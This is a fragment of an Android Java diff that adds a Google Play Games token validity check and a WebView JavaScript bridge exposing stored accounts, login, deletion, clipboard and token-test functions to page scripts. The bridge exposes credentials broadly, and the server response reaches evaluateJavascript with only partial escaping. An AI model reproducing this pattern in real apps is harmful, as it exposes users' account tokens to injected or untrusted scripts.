+                int responseCode = conn.getResponseCode();
+                BufferedReader br;
+                if (responseCode == 200) {
+                    br = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8"));
+                } else {
+                    br = new BufferedReader(new InputStreamReader(conn.getErrorStream(), "UTF-8"));
+                }
+
+                StringBuilder sb = new StringBuilder();
+                String line;
+                while ((line = br.readLine()) != null) {
+                    sb.append(line).append("\n");
+                }
+                br.close();
+
+                String respBody = sb.toString();
+                if (responseCode == 200 && respBody.contains("Auth=")) {
+                    success = true;
+                    resultMessage = "HTTP 200 OK: Play Games OAuth2 session acquired successfully! Token is 100% active.";
+                } else {
+                    success = false;
+                    resultMessage = "Google Response (" + responseCode + "): " + respBody.trim();
+                }
+            } catch (Throwable t) {
+                success = false;
+                resultMessage = "Connection error: " + t.getMessage();
+            }
+
+            final boolean finalSuccess = success;
+            final String finalMsg = resultMessage.replace("'", "\\'").replace("\n", " ");
+
+            activity.runOnUiThread(new GpgsResultRunnable(webView, finalSuccess, finalMsg));
         }
     }
 
-    private static class CloudSyncResultListener implements CloudSyncClient.SyncCallback {
+    // ================= JAVASCRIPT BRIDGE =================
+    public static class AndroidBridge {
         private final MainActivity activity;
-        private final String email;
-        private final String token;
-        CloudSyncResultListener(MainActivity activity, String email, String token) {
+
+        public AndroidBridge(MainActivity activity) {
             this.activity = activity;
-            this.email = email;
-            this.token = token;
         }
-        @Override public void onSuccess(String code) {
-            activity.onSyncResult(email, token, code);
+
+        @JavascriptInterface
+        public boolean isDeveloperMode() {
+            return activity.isDeveloperMode();
         }
-        @Override public void onError(String msg) {
-            activity.onSyncResult(email, token, "100000");
+
+        @JavascriptInterface
+        public String getAppInfo() {
+            return activity.getAppInfoJson();
+        }
+
+        @JavascriptInterface
+        public String getAccounts() {
+            return activity.getAccountsJson();
+        }
+
+        @JavascriptInterface
+        public void startGoogleLogin(final String country) {
+            activity.runOnUiThread(new StartGoogleLoginRunnable(activity, country));
+        }
+
+        @JavascriptInterface
+        public void closeGoogleLogin() {
+            activity.runOnUiThread(new CloseGoogleLoginRunnable(activity));
+        }
+
+        @JavascriptInterface
+        public void deleteAccount(final String code) {
+            activity.runOnUiThread(new DeleteAccountRunnable(activity, code));
+        }
+
+        @JavascriptInterface
+        public void copyToClipboard(final String text, final String label) {
+            activity.runOnUiThread(new CopyClipboardRunnable(activity, text, label));
+        }
+
+        @JavascriptInterface
+        public void openBrowser(final String url) {
+            activity.runOnUiThread(new OpenBrowserRunnable(activity, url));
+        }
+
+        @JavascriptInterface
+        public void syncCloudAccounts() {
+            activity.runOnUiThread(new SyncCloudRunnable(activity));
+        }
+
+        @JavascriptInterface
+        public void testGpgsToken(final String token) {
+            activity.testGpgsToken(token);
+        }
+    }
+
+    public static class StartGoogleLoginRunnable implements Runnable {
+        private final MainActivity act;
+        private final String country;
+        public StartGoogleLoginRunnable(MainActivity a, String c) { this.act = a; this.country = c; }
+        @Override public void run() { act.startGoogleLogin(country); }
+    }
+
+    public static class CloseGoogleLoginRunnable implements Runnable {
+        private final MainActivity act;
+        public CloseGoogleLoginRunnable(MainActivity a) { this.act = a; }
+        @Override public void run() { act.closeGoogleLogin(); }
+    }
+
+    public static class DeleteAccountRunnable implements Runnable {
+        private final MainActivity act;
+        private final String code;
+        public DeleteAccountRunnable(MainActivity a, String c) { this.act = a; this.code = c; }
+        @Override public void run() { act.doDeleteAccount(code); }
+    }
+
+    public static class CopyClipboardRunnable implements Runnable {
+        private final MainActivity act;
+        private final String text;
+        private final String label;
+        public CopyClipboardRunnable(MainActivity a, String t, String l) { this.act = a; this.text = t; this.label = l; }
+        @Override public void run() { act.copyToClipboard(text, label); }
+    }
+
+    public static class OpenBrowserRunnable implements Runnable {
+        private final MainActivity act;
+        private final String url;
+        public OpenBrowserRunnable(MainActivity a, String u) { this.act = a; this.url = u; }
+        @Override public void run() { act.openBrowserUrl(url); }
+    }
+
+    public static class SyncCloudRunnable implements Runnable {
+        private final MainActivity act;
+        public SyncCloudRunnable(MainActivity a) { this.act = a; }
+        @Override public void run() { act.restoreAccountsFromCloud(); }
+    }
+
+    public static class GpgsResultRunnable implements Runnable {
+        private final WebView webView;
+        private final boolean success;
+        private final String msg;
+        public GpgsResultRunnable(WebView wv, boolean s, String m) {
+            this.webView = wv;
+            this.success = s;
+            this.msg = m;
+        }
+        @Override
+        public void run() {
+            if (webView != null) {
+                webView.evaluateJavascript("if(window.onGpgsTestResult){ window.onGpgsTestResult(" + success + ", '" + msg + "'); }", null);
+            }
         }
     }
 }
